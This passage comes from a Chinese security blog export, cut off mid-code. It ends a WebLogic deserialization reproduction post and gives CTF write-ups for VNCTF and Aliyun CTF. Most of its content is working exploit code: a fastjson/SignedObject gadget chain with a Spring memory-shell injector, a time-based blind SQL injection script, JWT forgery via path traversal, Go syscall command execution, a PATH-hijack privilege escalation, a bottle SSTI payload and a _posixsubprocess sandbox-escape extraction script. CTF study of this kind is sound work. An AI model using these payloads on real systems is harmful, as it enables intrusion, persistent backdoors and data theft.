\\\u0026#34;weblogic.application.naming.MessageDestinationObjectFactory\\\u0026#34;);\\n\u0026#34; + \u0026#34; this.jndiName = $3;\\n\u0026#34; + \u0026#34; this.providerURL = $4;\\n\u0026#34; + \u0026#34; this.initialContextFactory = $5;\\n\u0026#34; + \u0026#34; }\u0026#34;); MessageDestinationReferenceCtClass.detach(); MessageDestinationReferenceCtClass.toClass(); MessageDestinationReference messageDestinationReference = new MessageDestinationReference(null, null, \u0026#34;rmi://ip:port/exp\u0026#34;, null, null); 回到前面，restOfName就是双引号之外的数据而且restOfName和第二个双引号直接要有一个.或/，类似这样：\u0026quot;\u0026lt;name\u0026gt;\u0026quot;/\u0026lt;restOfName\u0026gt;，bind用name，lookup用name + restOfName。\ncontext.rebind(\u0026#34;asda\u0026#34;, ref); context.lookup(\u0026#34;\\\u0026#34;asda\\\u0026#34;/asd\u0026#34;); 堆栈：\njavax.naming.InitialContext#lookup\rweblogic.application.naming.MessageDestinationReference#lookupMessageDestination\rweblogic.application.naming.MessageDestinationObjectFactory#getObjectInstance\rjavax.naming.spi.NamingManager#getObjectInstance\rjavax.naming.spi.NamingManager#getContext\rjavax.naming.spi.ContinuationContext#getTargetContext\rjavax.naming.spi.NamingManager#getContinuationContext\rweblogic.jndi.internal.BasicNamingNode#getContinuationCtx\rweblogic.jndi.internal.BasicNamingNode#lookupSharable\rweblogic.jndi.internal.PartitionHandler#lookupSharable\rweblogic.jndi.internal.ServerNamingNode#lookup\rweblogic.jndi.internal.RootNamingNode#lookup\rweblogic.jndi.internal.WLEventContextImpl#lookup\rweblogic.jndi.internal.WLContextImpl#lookup\rjavax.naming.InitialContext#lookup\rweblogic.corba.cos.naming.NamingContextImpl#resolveObject CVE-2024-21181 Weblogic 12.2.1.4\nJDK8u65\n另一个工厂类weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory其getObjectInstance方法代码如下：\npublic Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?, ?\u0026gt; environment) throws Exception { Reference ref = (Reference)Reference.class.cast(obj); String pName = (String)ref.get(\u0026#34;partitionName\u0026#34;).getContent(); JVMID jvmId = (JVMID)this.deserialize((byte[])((byte[])ref.get(\u0026#34;jvmId\u0026#34;).getContent())); if (!jvmId.isLocal()) { throw new Exception(name + \u0026#34; cannot be looked up using a remote JNDI context. Use JSR160 interface to use JMX remotely or use a local JNDI context to look up the local MBeanServer.\u0026#34;); } else { MBeanServer delegateMbs = this.getDelegateMbs(); assert delegateMbs != null; return (new PartitionedMbsFactory()).create(pName, delegateMbs); } } deserialize方法就是java原生反序列化，lookup一个Reference并指定工厂类即可。\n可以参考weblogic.management.mbeanservers.partition.PartitionedMbsRefObjFactory#createReference的代码写。需要注意的是PartitionedMbsRefObjFactory是抽象类，要找一个实现类比如PartitionedDomainRuntimeMbsRefObjFactory\n生成Reference:\nStringRefAddr addr = new StringRefAddr(\u0026#34;partitionName\u0026#34;, \u0026#34;asas\u0026#34;); Reference reference = new Reference(MBeanServer.class.getName(), addr, PartitionedDomainRuntimeMbsRefObjFactory.class.getName(), (String)null); RefAddr jvmIdAddr = new BinaryRefAddr(\u0026#34;jvmId\u0026#34;, getEvilData()); reference.add(jvmIdAddr); 12.2.1.4版本的CC为3.2.2版本，CC链不能利用了。\n参考 http://drops.xmd5.com/static/drops/web-13470.html\nhttps://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/\nhttps://github.com/Y4er/CVE-2020-2551\nhttps://l3yx.github.io/2020/04/22/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\nhttps://xz.aliyun.com/news/7094\nhttps://mp.weixin.qq.com/s/Mh9BDkKP79BPEYdAt5uhaw\nhttps://xz.aliyun.com/news/13742\nhttps://xz.aliyun.com/news/14609\n","permalink":"https://zoiltin.github.io/posts/weblogic-server%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","summary":"环境配置 使用WeblogicEnvironment项目搭建，地址：WeblogicEnvironment\nWeblogic Server官网下载地址：https://www.oracle.com/hk/middleware/technologies/weblogic-server-downloads.html\noracle删除了官网上所有的Weblogic Server 10.3.6.0.0的下载链接，只剩下了12.x和14.x的。不过我们可以通过url直接下载：http://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_generic.jar\ndocker build或者run的时候可能会内存不足，增加ulimit即可：--ulimit nofile=65535:65535\ndocker里的java版本最好和idea使用的版本一样，不然容易出现debug行号不一致的问题。\n由于centos 8 于2021年12月31日停止了源的服务，需要修改yum的源等等操作，修改Dockerfile:\nRUN cd /etc/yum.repos.d/\rRUN sed -i \u0026#39;s/mirrorlist/#mirrorlist/g\u0026#39; /etc/yum.repos.d/CentOS-*\rRUN sed -i \u0026#39;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g\u0026#39; /etc/yum.repos.d/CentOS-* 从容器里复制出lib导入idea即可开始debug，端口以为8453：\n/u01/app/oracle/middleware/modules /u01/app/oracle/middleware/wlserver\r/u01/app/oracle/middleware/coherence_3.7/lib T3反序列化 CVE-2015-4852 Weblogic 10.3.6\nJDK8u65\nT3协议部分参考：http://drops.xmd5.com/static/drops/web-13470.html\nWeblogic Server 使用T3协议进行RMI通信，请求包格式如下： 第一部分为T3协议头，后面跟着7段java序列化数据，将其中任意一部分改为恶意序列化数据即可。\n关于其中探测版本部分，我发现有时返回包会分到两个TCP数据包里发过来，所以脚本需要改一下：\ndata = sock.recv(1024) if len(data) == 4: data = data + sock.recv(1024) 数据流先进入InboundMsgAbbrev#readObject方法：\nprivate Object readObject(MsgAbbrevInputStream var1) throws IOException, ClassNotFoundException { int var2 = var1.read(); switch (var2) { case 0: return (new ServerChannelInputStream(var1)).","title":"Weblogic Server系列漏洞复现"},{"content":"VNCTF 5道web解出了4道\njavaGuide /deser路由可以反序列化，有spring boot和fastjson 1.2.83的依赖。\n反序列化有黑名单：\nprotected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = {\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax\u0026#34;, \u0026#34;javax.management\u0026#34;, \u0026#34;com.fasterxml.jackson\u0026#34;}; int length = denyClasses.length; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, className); } } return super.resolveClass(desc); } 可以用signedObject二次反序列化绕过\n利用链：\nEventListenerList.readobject() -\u0026gt;\rJSONArray.toString() -\u0026gt;\rSignedObject.getObject() -\u0026gt;\rEventListenerList.readobject() -\u0026gt;\rJSONArray.toString() -\u0026gt;\rTemplates.getOutputProperties() fastjson1.2.83使用引用绕过。\nTemplates templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,\u0026#34;_class\u0026#34;,null); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;asd\u0026#34;); JSONArray jsonArray1 = new JSONArray(); jsonArray1.add(templates); EventListenerList list1 = new EventListenerList(); UndoManager manager1 = new UndoManager(); Vector vector1 = (Vector) getFieldValue(manager1,\u0026#34;edits\u0026#34;); vector1.add(jsonArray1); setFieldValue(list1, \u0026#34;listenerList\u0026#34;, new Object[]{String.class, manager1}); HashMap hashMap1 = new HashMap(); hashMap1.put(templates, list1); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(\u0026#34;DSA\u0026#34;)); JSONArray jsonArray2 = new JSONArray(); jsonArray2.add(signedObject); EventListenerList list2 = new EventListenerList(); UndoManager manager2 = new UndoManager(); Vector vector2 = (Vector) getFieldValue(manager2,\u0026#34;edits\u0026#34;); vector2.add(jsonArray2); setFieldValue(list2, \u0026#34;listenerList\u0026#34;, new Object[]{String.class, manager2}); HashMap hashMap2 = new HashMap(); hashMap2.put(signedObject,list2); byte[] code = ser(hashMap2); System.out.println(Base64.getEncoder().encodeToString(code)); 容器不出网，可以打一个spring的内存马，我这里用的是Spring Interceptor内存马\n注入器（通过Template.defineClass加载）\npackage com.example.javaguide; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.handler.AbstractHandlerMapping; import java.lang.reflect.Field; import java.util.List; public class Evil extends AbstractTranslet { public Evil() throws Exception{ String encodedstr = \u0026#34;\u0026#34;; byte[] classBytes = java.util.Base64.getDecoder().decode(encodedstr); ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); org.springframework.web.context.WebApplicationContext context = null; try { org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes(); Class cla = requestAttributes.getClass(); java.lang.reflect.Method me = cla.getDeclaredMethod(\u0026#34;getRequest\u0026#34;, new Class[]{}); me.setAccessible(true); javax.servlet.http.HttpServletRequest httprequest = (javax.servlet.http.HttpServletRequest) me.invoke(requestAttributes, new Object[]{}); javax.servlet.http.HttpSession session = httprequest.getSession(); javax.servlet.ServletContext servletContext = session.getServletContext(); context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(servletContext); } catch (Exception e) { e.printStackTrace(); } java.lang.reflect.Method defineclass = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, new Class[]{byte[].class, int.class, int.class}); defineclass.setAccessible(true); HandlerInterceptor memShellInterceptor = null; try { memShellInterceptor = (HandlerInterceptor) Class.forName(\u0026#34;com.example.javaguide.EvilInterceptor\u0026#34;).newInstance(); } catch (Exception e){ memShellInterceptor = (HandlerInterceptor) ((Class) defineclass.invoke(classLoader, classBytes, 0, classBytes.length)).newInstance(); } AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(\u0026#34;requestMappingHandlerMapping\u0026#34;); Field field = AbstractHandlerMapping.class.getDeclaredField(\u0026#34;adaptedInterceptors\u0026#34;); field.setAccessible(true); List\u0026lt;Object\u0026gt; adaptedInterceptors = (List\u0026lt;Object\u0026gt;) field.get(abstractHandlerMapping); adaptedInterceptors.add(memShellInterceptor); System.out.println(\u0026#34;interceptor injected successfully\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 其中encodedstr为恶意Interceptor类的字节码base64\n恶意Interceptor类：\npackage com.example.javaguide; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class EvilInterceptor implements HandlerInterceptor { public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { try { Process exec = Runtime.getRuntime().exec(\u0026#34;cat /flag\u0026#34;); java.io.InputStream inputStream = exec.getInputStream(); javax.servlet.ServletOutputStream outputStream = response.getOutputStream(); byte[] buf = new byte[8192]; int length; while ((length = inputStream.read(buf)) != -1) { outputStream.write(buf, 0, length); } return false; } catch (Exception e) { e.printStackTrace(); } return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { } } 奶龙回家 返回包server为Werkzeug/3.1.3 Python/3.10.16，猜测为flask框架，凭经验来说一般搭配mysql或sqlite\nrandomblob(1000000000)可以延时，确定为sqlite数据库。\n通过测试猜测sql语句如下：\nselect * from users where username = \u0026#39;{username}\u0026#39; and password = \u0026#39;{password}\u0026#39;; 服务器应该还有一层检测，在flask路由处也会判断username和password是否正确。这就导致构造的万能密码无法登陆，但确可以盲注，当然也有可能时sql语句我猜错了。\n不过，至少以下payload可以时间盲注：\n{ \u0026#34;username\u0026#34; : \u0026#34;asdasda\u0026#39;/**/or/**/(length(username)\u0026gt;0)/**/or/**/randomblob(1000000000)\u0026gt;\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;/**/or/**/\u0026#39;zzzzzzzzzzzzzzz\u0026#39;\u0026gt;\u0026#39;\u0026#34; } 转换成sql语句如下(大概)：\nselect * from users where username = \u0026#39;asdasda\u0026#39;/**/or/**/(length(username)\u0026gt;0)/**/or/**/randomblob(1000000000)\u0026gt;\u0026#39; and password = \u0026#39;/**/or/**/\u0026#39;zzzzzzzzzzzzzzz\u0026#39;\u0026gt;\u0026#39;\u0026#39; 注释、空格以及等号被过滤了。\n当length(username)\u0026gt;0成立时由于or的短路特性，后面表达式不会运行，也就不会延时。\nexp:\nimport requests url = \u0026#39;http://\u0026#39; cha = \u0026#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#39; # cha = \u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39; payload = \u0026#34;asdasda\u0026#39;/**/or/**/((substr(password,{},1)\u0026lt;\u0026gt;\u0026#39;{}\u0026#39;))/**/or/**/randomblob(1000000000)\u0026gt;\u0026#34; # password = \u0026#39;woaipangmao114514\u0026#39; password = \u0026#39;\u0026#39; while len(password) \u0026lt; 17: signal = True for c in cha: json = { \u0026#34;username\u0026#34; : payload.format(str(len(password) + 1), c), \u0026#34;password\u0026#34; : \u0026#34;/**/or/**/\u0026#39;zzzzzzzzzzzzzzz\u0026#39;\u0026gt;\u0026#39;\u0026#34; } print(password + c, end=\u0026#39;\\r\u0026#39;) try: res = requests.post(url=url + \u0026#39;/login\u0026#39;, json=json, timeout=1) except KeyboardInterrupt as e: print(password) exit() except: password = password + c signal = False break if signal: password = password + \u0026#39;_\u0026#39; print(password) 账密：nailong:woaipangmao114514\nGin 权限使用jwt验证，jwt的key生成代码：\nfunc GenerateKey() string { rand.Seed(config.Year()) randomNumber := rand.Intn(1000) key := fmt.Sprintf(\u0026#34;%03d%s\u0026#34;, randomNumber, config.Key()) return key } 虽然用了随机数，但只要种子也就是config.Year()和config.Key()的值是固定的则key也是固定的。\n附件里的config目录里的key.go内容为空，需要从远程靶机获取。\n/download路由代码如下：\nfunc Download(c *gin.Context) { filename := c.DefaultQuery(\u0026#34;filename\u0026#34;, \u0026#34;\u0026#34;) if filename == \u0026#34;\u0026#34; { response.Response(c, http.StatusBadRequest, 400, nil, \u0026#34;Filename is required\u0026#34;) } basepath := \u0026#34;./uploads\u0026#34; filepath, _ := url.JoinPath(basepath, filename) if _, err := os.Stat(filepath); os.IsNotExist(err) { response.Response(c, http.StatusBadRequest, 404, nil, \u0026#34;File not found\u0026#34;) } c.Header(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment; filename=\u0026#34;+filename) c.File(filepath) } 存在目录穿越，可以用来下载任意文件。\n下载key.go：/download?filename=../config/key.go,内容如下：\npackage config func Key() string { return \u0026#34;r00t32l\u0026#34; } func Year() int64 { return 2025 } 现在可以伪造admin的token：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/golang-jwt/jwt/v4\u0026#34; ) func main() { token, err := GenerateToken(\u0026#34;admin\u0026#34;) if err != nil { fmt.Println(\u0026#34;error\u0026#34;) } fmt.Println(token) } func Key() string { return \u0026#34;r00t32l\u0026#34; } func Year() int64 { return 2025 } type JWTClaims struct { Username string `json:\u0026#34;username\u0026#34;` jwt.RegisteredClaims } func GenerateKey() string { rand.Seed(Year()) randomNumber := rand.Intn(1000) key := fmt.Sprintf(\u0026#34;%03d%s\u0026#34;, randomNumber, Key()) return key } func GenerateToken(username string) (string, error) { key := GenerateKey() claims := JWTClaims{ Username: username, RegisteredClaims: jwt.RegisteredClaims{ ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), Issuer: \u0026#34;Mash1r0\u0026#34;, Subject: \u0026#34;user token\u0026#34;, }, } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) signedToken, err := token.SignedString([]byte(key)) if err != nil { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;生成 token 时出错: %v\u0026#34;, err) } return signedToken, nil } func ParseToken(tokenString string) (*JWTClaims, error) { key := GenerateKey() token, err := jwt.ParseWithClaims(tokenString, \u0026amp;JWTClaims{}, func(token *jwt.Token) (interface{}, error) { return []byte(key), nil }) if err != nil { return nil, fmt.Errorf(\u0026#34;解析 token 时出错: %v\u0026#34;, err) } if claims, ok := token.Claims.(*JWTClaims); ok \u0026amp;\u0026amp; token.Valid { return claims, nil } else { return nil, fmt.Errorf(\u0026#34;无效的 token\u0026#34;) } } /eval路由可以执行go代码，但不允许import os/exec库。可以用syscall绕过，这种命令执行较为底层。\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { // 定义要执行的命令和参数 cmd := \u0026#34;/bin/sh\u0026#34; // 命令路径 args := []string{ \u0026#34;sh\u0026#34;, // 命令名 \u0026#34;-c\u0026#34;, // 参数 \u0026#34;ls -al /\u0026#34;, // 参数 } // 参数列表 // 创建子进程 attr := \u0026amp;syscall.ProcAttr{ Files: []uintptr{ uintptr(syscall.Stdin), uintptr(syscall.Stdout), uintptr(syscall.Stderr), }, Env: os.Environ(), // 继承当前环境变量 } // ForkExec 的参数需要将 args 转换为字符串数组 argv := make([]string, len(args)+1) copy(argv, args) argv[len(args)] = \u0026#34;\u0026#34; // 以空字符串结尾 // 创建子进程 pid, err := syscall.ForkExec(cmd, argv, attr) if err != nil { fmt.Printf(\u0026#34;ForkExec failed: %v\\n\u0026#34;, err) return } // 等待子进程结束 _, err = syscall.Wait4(pid, nil, 0, nil) if err != nil { fmt.Printf(\u0026#34;Wait4 failed: %v\\n\u0026#34;, err) return } fmt.Println(\u0026#34;Command executed successfully\u0026#34;) } 不知道是不是非预期，这么打的话没有用到/upload路由。\nflag并不在/flag里，真正的flag在/root/flag中，还需要提权。/.../Cat文件有suid权限。\n下载下来放到ida里看看： 会调用cat命令，可以通过修改环境变量中的$PATH，让root调用恶意的cat程序\n恶意cat代码如下：\n#include \u0026lt;stdlib.h\u0026gt; int main(){ system(\u0026#34;/usr/bin/cat /root/flag\u0026#34;); } 因为PATH修改了，所以expcat里需要用绝对路径，上传的话可以走/upload，不过会被ban，需要混淆一下。也可以直接base64通过/eval传进去，毕竟体积很小。\n执行：\nmv /tmp/expcat /tmp/cat \u0026amp;\u0026amp; chmod +x /tmp/cat \u0026amp;\u0026amp; export PATH=/tmp \u0026amp;\u0026amp; /.../Cat 通过/eval路由执行命令是无状态的，所以export PATH=/tmp和/.../Cat必须一次执行。\n学生姓名登记系统 题目描述说单文件框架，大概就是python里flask，fastapi那一类的web框架。\n存在SSTI，fuzz后发现{{print}}输出\u0026lt;built-in function print\u0026gt;，说明可以获取__builtins__里的内容。\n猜测服务器逻辑如下：\n黑名单匹配 判断每行是否超过23 尝试执行模板 若第三步报错，则将整个模板以文本输出 若第三步没报错，则将模板执行结果输出 可以通过{{globals()}}获取上下文环境。内容如下：\n{\u0026#39;_stdout\u0026#39;: []\r\u0026#39;_printlist\u0026#39;: \u0026lt;built-in method extend of list object at 0x7fbe45e07e80\u0026gt;\r\u0026#39;include\u0026#39;: functools.partial(\u0026lt;bound method SimpleTemplate._include of \u0026lt;bottle.SimpleTemplate object at 0x7fbe46a3f950\u0026gt;\u0026gt;\r{...})\r\u0026#39;rebase\u0026#39;: functools.partial(\u0026lt;bound method SimpleTemplate._rebase of \u0026lt;bottle.SimpleTemplate object at 0x7fbe46a3f950\u0026gt;\u0026gt;\r{...})\r\u0026#39;_rebase\u0026#39;: None\r\u0026#39;_str\u0026#39;: \u0026lt;function SimpleTemplate.prepare.\u0026lt;locals\u0026gt;.\u0026lt;lambda\u0026gt; at 0x7fbe45ec1580\u0026gt;\r\u0026#39;_escape\u0026#39;: \u0026lt;function SimpleTemplate.prepare.\u0026lt;locals\u0026gt;.\u0026lt;lambda\u0026gt; at 0x7fbe45ec1b20\u0026gt;\r\u0026#39;get\u0026#39;: \u0026lt;built-in method get of dict object at 0x7fbe45e580c0\u0026gt;\r\u0026#39;setdefault\u0026#39;: \u0026lt;built-in method setdefault of dict object at 0x7fbe45e580c0\u0026gt;\r\u0026#39;defined\u0026#39;: \u0026lt;built-in method __contains__ of dict object at 0x7fbe45e580c0\u0026gt;\r\u0026#39;__builtins__\u0026#39;: 得知是bottle的SimpleTemplate模板引擎。\n有每行的长度限制，需要绕过，先审计代码：\nSimpleTemplate.execute函数用于执行模板：\ndef execute(self, _stdout, kwargs): env = self.defaults.copy() env.update(kwargs) env.update({ \u0026#39;_stdout\u0026#39;: _stdout, \u0026#39;_printlist\u0026#39;: _stdout.extend, \u0026#39;include\u0026#39;: functools.partial(self._include, env), \u0026#39;rebase\u0026#39;: functools.partial(self._rebase, env), \u0026#39;_rebase\u0026#39;: None, \u0026#39;_str\u0026#39;: self._str, \u0026#39;_escape\u0026#39;: self._escape, \u0026#39;get\u0026#39;: env.get, \u0026#39;setdefault\u0026#39;: env.setdefault, \u0026#39;defined\u0026#39;: env.__contains__ }) exec(self.co, env) if env.get(\u0026#39;_rebase\u0026#39;): subtpl, rargs = env.pop(\u0026#39;_rebase\u0026#39;) rargs[\u0026#39;base\u0026#39;] = \u0026#39;\u0026#39;.join(_stdout) #copy stdout del _stdout[:] # clear stdout return self._include(env, subtpl, **rargs) return env 通过exec函数执行self.co中的字节码，除了__builtins__外，还能获取另外几个SimpleTemplate提供的方法。\n字节码由SimpleTemplate.code()生成，在StplParser.translate()中使用正则匹配{{}}:\ndef translate(self): if self.offset: raise RuntimeError(\u0026#39;Parser is a one time instance.\u0026#39;) while True: m = self.re_split.search(self.source, pos=self.offset) if m: text = self.source[self.offset:m.start()] self.text_buffer.append(text) self.offset = m.end() if m.group(1): # Escape syntax line, sep, _ = self.source[self.offset:].partition(\u0026#39;\\n\u0026#39;) self.text_buffer.append(self.source[m.start():m.start(1)] + m.group(2) + line + sep) self.offset += len(line + sep) continue self.flush_text() self.offset += self.read_code(self.source[self.offset:], multiline=bool(m.group(4))) else: break self.text_buffer.append(self.source[self.offset:]) self.flush_text() return \u0026#39;\u0026#39;.join(self.code_buffer) 然后StplParser.flush_text()将被{{}}包裹的内容由_printlist((%s,))包裹，拼接到python代码里。\n例如{{print}}转换为_printlist((_escape(print),))，代码的注入点在元组内，可以使用海象运算符赋值，直接声明变量会报错。\n{{a:=print}}\r{{a(1)}}\r// print(1) 这样就可以缩短每一行的长度并绕过waf了。\nos.popen等函数被hook了，但subprocess没被hook。\npoc：\n{{b:=__builtins__}}\r{{e:=b[\u0026#34;ev\u0026#34;\u0026#34;al\u0026#34;]}}\r{{a:=\u0026#34;__import__\u0026#34;}}\r{{c:=\u0026#34;(\u0026#39;subproces\u0026#34;}}\r{{d:=\u0026#34;s\u0026#39;).getout\u0026#34;}}\r{{f:=\u0026#34;put\u0026#34;}}\r{{g:=e(a+c+d+f)}}\r{{g(\u0026#34;cat /flag\u0026#34;)}} payload需要url编码，否则会出问题\nAliyun CTF ezoj 一个在线OJ系统，python沙箱逃逸，关键代码如下：\nCODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#34;/api/submit\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def submit_code(): try: data = request.get_json() code = data.get(\u0026#34;code\u0026#34;) problem_id = data.get(\u0026#34;problem_id\u0026#34;) if code is None or problem_id is None: return ( jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Missing \u0026#39;code\u0026#39; or \u0026#39;problem_id\u0026#39;\u0026#34;}), 400, ) problem_id = str(int(problem_id)) problem_dir = PROBLEMS_PATH / problem_id if not problem_dir.exists(): return ( jsonify( {\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Problem ID {problem_id} not found!\u0026#34;} ), 404, ) code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) result = judge(code_filename, problem_dir) code_filename.unlink() return jsonify(result) except Exception as e: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: str(e)}), 500 def judge(code_filename, problem_dir): test_files = sorted(problem_dir.glob(\u0026#34;*.input\u0026#34;)) total_tests = len(test_files) passed_tests = 0 try: for test_file in test_files: input_file = test_file expected_output_file = problem_dir / f\u0026#34;{test_file.stem}.output\u0026#34; if not expected_output_file.exists(): continue case_passed = run_code(code_filename, input_file, expected_output_file) if case_passed: passed_tests += 1 if passed_tests == total_tests: return {\u0026#34;status\u0026#34;: \u0026#34;AC\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Accepted\u0026#34;} else: return { \u0026#34;status\u0026#34;: \u0026#34;WA\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Wrang Answer: pass({passed_tests}/{total_tests})\u0026#34;, } except OJRuntimeError as e: return {\u0026#34;status\u0026#34;: \u0026#34;RE\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Runtime Error: ret={e.args[0]}\u0026#34;} except OJTimeLimitExceed: return {\u0026#34;status\u0026#34;: \u0026#34;TLE\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Time Limit Exceed\u0026#34;} def run_code(code_filename, input_file, expected_output_file): with open(input_file, \u0026#34;r\u0026#34;) as infile, open( expected_output_file, \u0026#34;r\u0026#34; ) as expected_output: expected_output_content = expected_output.read().strip() process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) except subprocess.TimeoutExpired: process.kill() raise OJTimeLimitExceed if process.returncode != 0: raise OJRuntimeError(process.returncode) if stdout.strip() == expected_output_content: return True else: return False if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) 沙箱audithook是白名单，只允许：import, time.sleep, builtins.input, builtins.input/result。\nlinux下可以使用_posixsubprocess库执行命令，_posixsubprocess是CPython内部实现，audithook没有相应的事件拦截，参考：https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html\n题目不出网，白名单里有time.sleep，可能预期解是时间盲注，但这题可以布尔盲注(AC和WA)，效率更高一点。\nflag文件名的格式为flag-\u0026lt;uuid4\u0026gt;, 获取flag文件名的exp:\nimport requests import string import time import json url = \u0026#39;http://ip:port\u0026#39; cha = \u0026#39;0123456789abcdef-\\n\u0026#39; code = \u0026#39;\u0026#39;\u0026#39; import _posixsubprocess import os problem = input() a = int(problem.split(\u0026#39; \u0026#39;)[0]) b = int(problem.split(\u0026#39; \u0026#39;)[1]) stdout_read, stdout_write = os.pipe() _posixsubprocess.fork_exec([b\u0026#34;/bin/ls\u0026#34;,\u0026#34;/\u0026#34;], [b\u0026#34;/bin/ls\u0026#34;], True, (), None, None, -1, -1, -1, stdout_write, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) os.close(stdout_write) res = os.read(stdout_read, 1024).decode() if res[{}] == \u0026#39;{}\u0026#39;: print(a + b) else: print(a + b - 1) \u0026#39;\u0026#39;\u0026#39;.strip() target = \u0026#39;app\\nbin\\nboot\\ndev\\netc\\nflag-\u0026#39; while target[-1] != \u0026#39;}\u0026#39;: for i in cha: # time.sleep(0.5) if i == \u0026#39;\\n\u0026#39;: i = \u0026#39;\\\\n\u0026#39; payload = { \u0026#34;problem_id\u0026#34; : \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34; : code.format(str(len(target)), i) } print((target + i).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\\\n\u0026#39;), end=\u0026#39;\\r\u0026#39;) try: sp = requests.post(url=url + \u0026#39;/api/submit\u0026#39;, json=payload) except KeyboardInterrupt as e: print(target) exit() except: print(\u0026#39;network error\u0026#39;) print(target) exit() pass if json.loads(sp.text)[\u0026#39;status\u0026#39;] == \u0026#39;AC\u0026#39;: if i == \u0026#39;\\\\n\u0026#39;: target = target + \u0026#39;\\n\u0026#39; target = target + i break flag格式为aliyunctf{\u0026lt;uuid4\u0026gt;}, 盲注出flag的exp：\nimport requests import string import time import json url = \u0026#39;http://ip:port\u0026#39; cha = \u0026#39;0123456789abcdef-}\u0026#39; code = \u0026#39;\u0026#39;\u0026#39; import _posixsubprocess import os problem = input() a = int(problem.split(\u0026#39; \u0026#39;)[0]) b = int(problem.split(\u0026#39; \u0026#39;)[1]) stdout_read, stdout_write = os.pipe() _posixsubprocess.fork_exec([b\u0026#34;/bin/cat\u0026#34;,\u0026#34;/\u0026lt;flag file name\u0026gt;\u0026#34;], 